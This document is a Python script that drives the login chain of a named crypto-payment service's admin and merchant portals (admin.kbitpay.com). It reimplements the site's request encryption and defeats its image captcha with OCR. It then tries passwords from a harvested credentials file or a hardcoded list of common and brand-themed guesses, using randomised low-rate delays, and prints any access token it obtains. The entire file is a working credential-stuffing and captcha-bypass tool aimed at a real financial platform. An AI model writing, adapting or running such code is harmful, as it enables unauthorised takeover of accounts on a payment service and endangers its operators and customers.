#!/usr/bin/env python3
"""kbp_full.py - full login-chain driver for KBitPay admin/mch portals.

Reuses the SPA crypto (RSA wrap + AES-256-CBC) from kbp_admin_login.py but adds:
  * persistent cookie jar (server-side email-code session from CheckCaptchaCode)
  * image captcha solve via ddddocr (pip install ddddocr)
  * full SPA-equivalent flow with fallback payload variants

Modes:
  cap                    fetch /api/Login/Verification, print Key + Img b64, save
                         /tmp/cap.png, OCR with ddddocr (raw + preprocessed)
  full <email> <code>    admin portal: CheckLastLogin -> CheckCaptchaCode(type=2)
                         -> captcha fetch+OCR (up to 3 tries) -> Login
                         {verificationCode=OCR answer, verificationKey} -> token
                         fallback variants: B) verificationCode=<email code>,
                         C) no captcha fields (cookie jar only)
  fullmch <email> <code> mch portal: CheckLastLogin(email,code) -> Login
                         (appID from KBP_APPID env, isAdmin=false, no captcha)

Low-rate: random 8-15s sleeps. Read-only except SentVerificationCode (sends ONE
email code, which is the point of this chain).
"""
import base64, http.cookiejar, json, os, random, sys, time, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kbp_admin_login import rsa_encrypt, aes_enc, aes_dec  # openssl crypto helpers

BASE = os.environ.get("KBP_BASE", "https://admin.kbitpay.com")
APPID = os.environ.get("KBP_APPID", "")
ISADMIN = os.environ.get("KBP_ISADMIN", "true").lower() != "false"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def http(method, path, data=None, headers=None, timeout=40):
    hdrs = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8"}
    if headers:
        hdrs.update(headers)
    body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(BASE + path, method=method, data=body, headers=hdrs)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore"), dict(e.headers)
    except Exception as e:
        return 0, "ERR:" + str(e), {}


class Client:
    def __init__(self):
        self.key_id = None
        self.key = None
        self.iv = None
        self.pub = None

    def fetch_key(self):
        st, raw, _ = http("GET", "/api/webv1/Common/GetRsaPublicKey")
        d = json.loads(raw)
        rd = d.get("ResData") or d.get("resData") or d
        self.key_id = rd["KeyId"]
        self.pub = rd["PublicKey"]
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        return d

    def post_enc(self, path, obj, headers=None):
        if not self.key_id:
            self.fetch_key()
        body = json.dumps(obj, ensure_ascii=False).encode()
        enc_data = aes_enc(self.key, self.iv, body)
        enc_key = rsa_encrypt(self.pub, json.dumps(
            {"key": base64.b64encode(self.key).decode(),
             "iv": base64.b64encode(self.iv).decode()}).encode())
        payload = {"keyId": self.key_id,
                   "encryptKey": base64.b64encode(enc_key).decode(),
                   "encryptData": enc_data}
        st, raw, hdrs = http("POST", path, json.dumps(payload), headers=headers)
        try:
            d = json.loads(raw)
        except Exception:
            return {"_http": st, "_text": raw[:400]}
        if isinstance(d, dict):
            if d.get("encryptData"):
                try:
                    inner = json.loads(aes_dec(self.key, self.iv, d["encryptData"]))
                    d["_decrypted"] = inner
                except Exception:
                    pass
            rd = d.get("ResData")
            if isinstance(rd, str):
                try:
                    d["ResData"] = json.loads(aes_dec(self.key, self.iv, rd))
                except Exception:
                    pass
        return d

    def get(self, path, headers=None):
        st, raw, hdrs = http("GET", path, headers=headers)
        try:
            return json.loads(raw)
        except Exception:
            return {"_http": st, "_text": raw[:400]}


def pause():
    time.sleep(random.uniform(8, 15))


_TESS_WHITELIST = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


def _tess_file(tfname, psm):
    import re as _re, subprocess
    out = subprocess.run(
        ["tesseract", tfname, "stdout", "--psm", psm,
         "-c", "tessedit_char_whitelist=" + _TESS_WHITELIST],
        capture_output=True, timeout=30)
    return _re.sub(r"\s+", "", out.stdout.decode("utf-8", "ignore").strip())


def _tess_on_image(name, im, answers):
    import tempfile, os
    tf = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
    im.save(tf.name)
    tfname = tf.name
    tf.close()
    try:
        for psm in ("7", "8", "13"):
            try:
                t = _tess_file(tfname, psm)
                if t:
                    answers.append(("%s_psm%s" % (name, psm), t))
            except Exception as e:
                print("[!] tess %s psm%s err %s" % (name, psm, e), flush=True)
    finally:
        try:
            os.unlink(tfname)
        except Exception:
            pass


def ocr_answers(img_bytes):
    """Candidate answers in priority order: ddddocr (raw+preproc) then tesseract
    (PIL-preproc if available, else raw stdin). PIL-free tesseract fallback."""
    import re as _re
    answers = []
    have_pil = False
    # --- ddddocr ---
    try:
        import ddddocr
        from PIL import Image, ImageOps
        have_pil = True
        ocr = ddddocr.DdddOcr(show_ad=False)
        try:
            answers.append(("dd_raw", ocr.classification(img_bytes)))
        except Exception as e:
            print("[!] ocr raw err %s" % e, flush=True)
        try:
            img = Image.open(io_bytes(img_bytes)).convert("L")
            img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
            img = ImageOps.autocontrast(img)
            answers.append(("dd_gray3x", ocr.classification(io_bytes2(img))))
        except Exception as e:
            print("[!] ocr preproc err %s" % e, flush=True)
    except Exception as e:
        print("[!] ddddocr missing: %s" % e, flush=True)
    # --- tesseract ---
    try:
        import subprocess
        if have_pil:
            from PIL import Image, ImageOps
            img = Image.open(io_bytes(img_bytes)).convert("L")
            _tess_on_image("tess_raw", img, answers)
            up = img.resize((img.width * 4, img.height * 4), Image.LANCZOS)
            up = ImageOps.autocontrast(up)
            _tess_on_image("tess_up", up, answers)
            _tess_on_image("tess_bw", up.point(lambda p: 255 if p > 140 else 0), answers)
        else:
            # PIL-free: raw PNG to temp file, tesseract CLI only
            import tempfile, os
            tf = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tf.write(img_bytes)
            tfname = tf.name
            tf.close()
            try:
                for psm in ("7", "8", "13"):
                    try:
                        t = _tess_file(tfname, psm)
                        if t:
                            answers.append(("tess_rawpsm%s" % psm, t))
                    except Exception as e:
                        print("[!] tess psm%s err %s" % (psm, e), flush=True)
            finally:
                try:
                    os.unlink(tfname)
                except Exception:
                    pass
    except Exception as e:
        print("[!] tesseract missing: %s" % e, flush=True)
    # dedupe preserving order
    seen = set()
    out = []
    for name, a in answers:
        a2 = _re.sub(r"[^A-Za-z0-9]", "", a)
        if a2 and a2 not in seen:
            seen.add(a2)
            out.append((name, a2))
    return out


def io_bytes(b):
    import io
    return io.BytesIO(b)


def io_bytes2(img):
    import io
    b = io.BytesIO()
    img.save(b, format="PNG")
    return b.getvalue()


def fetch_captcha(c):
    r = c.get("/api/Login/Verification")
    rd = r.get("ResData") or r.get("resData") or {}
    if isinstance(rd, str):
        try:
            rd = json.loads(rd)
        except Exception:
            rd = {}
    img_b64 = rd.get("Img") or rd.get("img") or rd.get("image") or ""
    key = rd.get("Key") or rd.get("key") or rd.get("captchaKey") or ""
    return r, img_b64, key


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "cap"
    c = Client()
    print("[*] base=%s mode=%s appid=%r isAdmin=%s cookies=%d" % (
        BASE, mode, APPID, ISADMIN, len(cj)), flush=True)
    try:
        c.fetch_key()
        print("[*] key ok KeyId=%s" % c.key_id, flush=True)
    except Exception as e:
        print("[!] fetch_key failed: %s" % e, flush=True)
        sys.exit(1)

    if mode == "cap":
        r, img_b64, key = fetch_captcha(c)
        print("CAP Verification -> %s" % json.dumps(r, ensure_ascii=False)[:200], flush=True)
        print("CAP key=%s imglen=%d" % (key, len(img_b64)), flush=True)
        if img_b64:
            raw = base64.b64decode(img_b64)
            open("/tmp/cap.png", "wb").write(raw)
            print("CAP img_b64_full=%s" % img_b64, flush=True)
            for name, ans in ocr_answers(raw):
                print("CAP OCR %s -> %r" % (name, ans), flush=True)
        else:
            print("CAP no image in response", flush=True)
        print("[*] done", flush=True)
        return

    if mode == "full":
        em = sys.argv[2] if len(sys.argv) > 2 else ""
        code = sys.argv[3] if len(sys.argv) > 3 else ""
        if not em or not code:
            print("[!] need email + code", flush=True)
            sys.exit(1)
        import urllib.parse
        r1 = c.get("/api/Login/CheckLastLogin?email=" + urllib.parse.quote(em))
        print("FULL CheckLastLogin -> %s" % json.dumps(r1, ensure_ascii=False)[:200], flush=True)
        pause()
        r2 = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": "2"})
        print("FULL CheckCaptchaCode -> %s" % json.dumps(r2, ensure_ascii=False)[:200], flush=True)
        pause()
        # pwd candidates: email-matched lines from KBP_CREDS, else fallback family
        pwds = []
        try:
            for line in open("/tmp/kbp_creds.txt"):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    e, p = line.split("|", 1)
                    if e.lower() == em.lower():
                        pwds.append(p)
        except Exception as ex:
            print("[!] creds file unavailable: %s" % ex, flush=True)
        if not pwds:
            pwds = ["Aa123456.", "666666", "123456", "k4806008",
                    "Admin@123", "Keepbit@123", "Qqlink@123"]
        pwds = pwds[:1]  # budget: <=5 req/run -> exactly ONE pwd per run
        print("[*] FULL pwd candidates: %d (budget 5req/run)" % len(pwds), flush=True)
        for pi, pwd in enumerate(pwds):
            r3, img_b64, key = fetch_captcha(c)
            print("FULL pwd#%d captcha key=%s imglen=%d" % (pi, key, len(img_b64)), flush=True)
            cands = []
            if img_b64:
                raw = base64.b64decode(img_b64)
                open("/tmp/cap.png", "wb").write(raw)
                for name, a in ocr_answers(raw):
                    print("FULL OCR#%d %s -> %r" % (pi, name, a), flush=True)
                    if a and re_full_code(a):
                        cands.append(a)
            if not cands:
                cands = [""]
            logged = 0
            for ans in cands[:2]:  # at most 2 Login POSTs, same key
                payload = {"appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
                           "email": em, "isAdmin": ISADMIN, "language": "en",
                           "verificationCode": ans, "verificationKey": key}
                r4 = c.post_enc("/api/Login/Login", payload)
                logged += 1
                rc = r4.get("ErrCode")
                rd = r4.get("ResData")
                tok = ""
                if isinstance(rd, dict):
                    tok = rd.get("AccessToken") or rd.get("accessToken") or ""
                print("FULL LOGIN#%d pwd=%r cap=%r -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
                    pi, pwd, ans, rc, r4.get("ErrMsg"), r4.get("Success"),
                    (tok[:60] + "...") if tok else ""), flush=True)
                if tok:
                    print("TOKEN %s" % tok, flush=True)
                    break
                if rc == "200" or (isinstance(rc, int) and rc == 200):
                    print("FULL LOGIN#%d Success=true" % pi, flush=True)
                    break
                if "4042" not in str(rc):
                    break  # captcha accepted; pwd-level/other error -> stop run
                if logged >= 2:
                    break
                # 4042 wrong captcha: try next candidate on same key once
            break
        print("[*] done", flush=True)
        return

    if mode == "fullmch":
        em = sys.argv[2] if len(sys.argv) > 2 else ""
        code = sys.argv[3] if len(sys.argv) > 3 else ""
        if not em or not code:
            print("[!] need email + code", flush=True)
            sys.exit(1)
        import urllib.parse
        r1 = c.get("/api/Login/CheckLastLogin?email=" + urllib.parse.quote(em) +
                   "&verificationCode=" + urllib.parse.quote(code))
        print("MCH CheckLastLogin(code) -> %s" % json.dumps(r1, ensure_ascii=False)[:250], flush=True)
        pause()
        r2 = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": "2"})
        print("MCH CheckCaptchaCode -> %s" % json.dumps(r2, ensure_ascii=False)[:200], flush=True)
        pause()
        for label, pwd in (("Aa123456.", "Aa123456."), ("666666", "666666")):
            r3 = c.post_enc("/api/Login/Login", {
                "appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
                "email": em, "isAdmin": False, "language": "en"})
            rd3 = r3.get("ResData")
            tok = ""
            if isinstance(rd3, dict):
                tok = rd3.get("AccessToken") or rd3.get("accessToken") or ""
            print("MCH LOGIN %s -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
                label, r3.get("ErrCode"), r3.get("ErrMsg"), r3.get("Success"),
                (tok[:60] + "...") if tok else ""), flush=True)
            if tok:
                print("TOKEN %s" % tok, flush=True)
                break
            if "4047" in str(r3.get("ErrCode")):
                break
            pause()
        print("[*] done", flush=True)
        return

    print("[!] unknown mode %s" % mode, flush=True)


def re_full_code(a):
    import re
    return bool(a and re.fullmatch(r"[A-Za-z0-9]{4,6}", a))


if __name__ == "__main__":
    main()
